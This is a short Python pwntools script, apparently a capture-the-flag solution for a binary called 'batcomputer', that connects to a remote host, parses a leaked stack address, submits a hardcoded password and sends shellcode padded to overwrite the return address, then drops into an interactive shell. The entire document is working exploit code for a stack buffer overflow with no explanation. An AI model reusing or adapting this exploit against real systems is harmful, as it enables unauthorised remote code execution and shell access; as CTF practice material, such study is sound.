from pwn import *

context.binary = ELF("./batcomputer")
con = remote('94.237.48.205',49716)

con.sendline('1')

con.recvuntil('0x')

stack_base = int(("0x"+con.recv().decode('latin-1').split()[0]),16)

log.success(f'stack base: {hex(stack_base)}')

con.sendline('2')

con.sendline('b4tp@$$w0rd!')

payload = asm(shellcraft.popad() + shellcraft.sh()) # shellcode

payload += b'A'*(84 - len(payload)) # nop

payload += p64(stack_base) # stack base

con.sendline(payload)

con.sendline('3')

con.interactive()
